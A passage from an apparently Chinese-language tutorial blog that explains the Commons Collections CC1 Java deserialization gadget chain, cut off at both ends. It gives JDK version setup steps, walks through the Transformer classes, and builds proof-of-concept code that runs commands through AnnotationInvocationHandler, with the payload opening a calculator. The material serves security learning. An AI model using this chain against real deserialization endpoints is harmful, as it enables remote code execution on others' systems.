  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>将上述代码中的计算器地址 替换成你本地环境⾥的计算器路径，运⾏就会发现弹出了计算器，下面说有以下所用到的接口和类</p><p>这里再导入包的时候经常会出错，原因就在于导入错包了</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191222535.png" alt="image-20230218210130035"> </p><p>一般系统自动导入的包是javax.xml.transform.Transformer;</p><p>但实际上Transformer是org.apache.commons.collections.Transformer;</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这个地方jdk的版本非常重要，我原本用的是jdk11，结果调用java内置的类的时候代码完全和网上的不一样，我以为时版本太低，换成了jdk17，结果还是不行，最后我换成了jdk8u67（一定要8u71以前的版本，不然不行），但是换完以后还是不行，通过陈杰好哥哥的帮忙才修改好，以下是配置步骤</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191222109.png" alt="image-20230111194851429"> </p><p>先点编辑配置</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191222758.png" alt="image-20230111194914219"> </p><p>这个地方换成自己的jdk路径</p><p>此时仍然不行，依然显示我用的jdk11</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223293.png" alt="image-20230111195036233"> </p><p>点这里的项目结构</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223777.png" alt="image-20230111195054106"> </p><p>将这里的sdk换成自己的路径</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223742.png" alt="image-20230111195216049"> </p><p>最后换掉这里的sdk，即可开始我们的学习之路</p><h2 id="P神的CC1利用链"><a href="#P神的CC1利用链" class="headerlink" title="P神的CC1利用链"></a>P神的CC1利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonCollections1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="类的理解"><a href="#类的理解" class="headerlink" title="类的理解"></a>类的理解</h3><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,<br>valueTransformer);<br></code></pre></td></tr></table></figure><p>在这里，TransformedMap.decorate() 方法返回一个新的 Map 对象，该对象由 innerMap 进行装饰。decorate包括对 innerMap 的键和值进行变换，通过 keyTransformer 和 valueTransformer 实现。</p><p>新的 Map 对象 outerMap 包含了 innerMap 的所有元素，但是键和值都已经被转换过了。</p><p>这里面的decorate方法源码是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法需要三个参数:</p><ul><li>innerMap：需要被装饰的 Map 对象</li><li>keyTransformer：用来对 innerMap 的键进行变换的函数</li><li>valueTransformer：用来对 innerMap 的值进行变换的函数</li></ul><p>这个方法的实现过程中，会通过遍历 innerMap 的所有元素，并使用 keyTransformer 和 valueTransformer 对键和值进行变换。最后，创建一个新的 Map 对象，该对象的元素由转换后的键和值组成。</p><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br> <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个’’回调函数’’，这个回调的参数是原始对象。</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iConstant = constantToReturn;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br> <span class="hljs-keyword">return</span> iConstant;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键。</p><p>在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[]</span><br><span class="hljs-params">args)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iMethodName = methodName;<br> iParamTypes = paramTypes;<br> iArgs = args;<br>&#125;<br></code></pre></td></tr></table></figure><p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br> <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br> &#125;<br> <span class="hljs-keyword">try</span> &#123;<br> <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br> <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>     <span class="hljs-comment">//实例化类，并获得类的方法，最后就可以执行任意函数</span><br> &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +<br>iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br> &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +<br>iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br> &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +<br>iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223375.png" alt="image-20221002194905431"> </p><p>上面有注释的那一行的含义如图所示，如此可以执行任意方法</p><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：</p><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223611.png" alt="image-20230111101736120"> </p><p>代码如下图所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iTransformers = transformers;<br>&#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br> object = iTransformers[i].transform(object);<br> &#125;<br> <span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="源码理解"><a href="#源码理解" class="headerlink" title="源码理解"></a>源码理解</h3><p>看代码的主要部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>&#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),<br>&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><p>就像上面介绍的一样，ChainedTransformer包括了ConstantTransformer和InvokerTransformer，前者返回Runtime对象，InvorkerTransformer执行Runtime对象的exec方法，参数就是我们计算器</p><p>可以这样理解，Transformer把ConstantTransformer和InvokerTransformer装在了一起，相当于调用了<code>Runtime.getRuntime.exec.calc</code>然后放在了chain中</p><p>还有一个地方有疑惑，new Transformer[]是个什么用法</p><blockquote><p>是数组的声明与创建</p><p> <img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223818.png" alt="image-20220314204957973"> </p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223139.png" alt="image-20220314205656861"> </p></blockquote><p>当然，这个transformerChain只是⼀系列回调，我们需要⽤其来包装innerMap，使⽤的前⾯说到的TransformedMap.decorate ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br></code></pre></td></tr></table></figure><p>因为这里的outerMap对象被使用TransformedMap.decorate方法进行装饰，使用的Transformer对象是ChainedTransformer，其中包含了ConstantTransformer和InvokerTransformer对象。因此，当向outerMap中添加键值对时，每个值都会被依次经过这两个Transformer对象的转换。</p><p>然后想map中放入一个新的元素来触发回调</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br></code></pre></td></tr></table></figure><p>比如这里，现在test的值为xxxx，”xxxx”会被ChainedTransformer中的ConstantTransformer转换成Runtime对象，然后被InvokerTransformer调用，最终会执行”&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator”这个命令。由于这个命令是打开Mac系统自带的计算器应用程序，因此outerMap中的键值对为{“test”, 计算器应用程序的返回值}</p><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>我们前面说过，触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个类，它在反序列化的readObject逻辑里有类似的写入操作。</p><p>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler ，我们查看它的readObject方法（这是8u71以前的代码，8u71以后做了一些修改，这个面再说）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>      <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>s.defaultReadObject();<br><br>      <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>      <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">try</span> &#123;<br>          annotationType = AnnotationType.getInstance(t);<br>      &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>          <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>      &#125;<br><br>      Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>      <span class="hljs-comment">// 与运行时映射类型一致</span><br>      Map&lt;String, Object&gt; mv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();<br><br>      <span class="hljs-comment">// If there are annotation members without values, that</span><br>      <span class="hljs-comment">// situation is handled by the invoke method.</span><br>      <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;<br>          <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>          <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>          Class&lt;?&gt; memberType = memberTypes.get(name);<br>          <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>              value = memberValue.getValue();<br>              <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                    value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                  value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                          value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                              annotationType.members().get(name));<br>              &#125;<br>          &#125;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>核心逻辑就是 <code>Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()</code> 和<code>memberValue.setValue(...)</code> 。</p><p>memberValues就是反序列化后得到的Map，也是经过了<code>TransformedMap</code>修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的Transform，进而执行我们为其精心设计的任意代码。</p><p>所以，我们构造POC的时候，就需要创建一个<code>AnnotationInvocationHandler</code>对象，并将前面构造的HashMap设置进来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span><br>Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>construct.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> construct.newInstance(Retention.class, outerMap);<br></code></pre></td></tr></table></figure><p>这里因为 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 是在JDK内部的类，不能直接使用new来实例化。我使用反射获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化了。</p><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第一个参数是一个<code>Annotation</code>类；第二个是参数就是前面构造的Map。</p><h4 id="使用反射的原因"><a href="#使用反射的原因" class="headerlink" title="使用反射的原因"></a>使用反射的原因</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>oos.writeObject(obj);<br>oos.close();<br></code></pre></td></tr></table></figure><p>我将这几段代码拼接到demo代码的后面，组成一个完整的POC。我们试着运行这个POC，看看能否生成序列化数据流：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span>&#125;),<br>        &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        innerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span><br>            Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> construct.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(obj);<br>        oos.close();<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191223569.png" alt="image-20230111153631865"> </p><p>出现异常</p><p>原因是，Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实现了 java.io.Serializable 接口。而我们最早传给ConstantTransformer的是Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接口的，所以不允许被序列化。</p><p>我们可以通过反射来获取到当前上下文中的Runtime对象，而不需要直接使用这个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) f.invoke(<span class="hljs-literal">null</span>);<br>r.exec(<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);<br></code></pre></td></tr></table></figure><p>转化为transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span 